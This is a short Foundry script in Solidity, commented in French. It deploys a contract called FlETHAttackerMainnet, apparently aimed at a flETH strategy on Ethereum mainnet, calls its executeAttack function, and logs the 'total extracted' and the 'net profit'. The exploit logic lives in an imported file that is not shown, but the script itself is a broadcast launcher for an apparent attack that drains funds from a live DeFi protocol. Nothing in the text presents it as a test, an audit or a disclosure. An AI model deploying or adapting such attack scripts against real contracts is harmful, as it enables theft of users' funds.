// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/FlETHAttackerMainnet_flETH_to_Strategy_2.sol";

contract DeployAndAttack2 is Script {
    function run() external {
        vm.startBroadcast();

        // Déployer le contrat
        FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
        console.log("Contract deployed at:", address(attacker));

        // Exécuter l'attaque
        attacker.executeAttack();
        console.log("Attack executed!");

        // Vérifier les résultats
        console.log("Total extracted:", attacker.totalExtracted());
        console.log("Net profit:", attacker.netProfit());

        vm.stopBroadcast();
    }
}
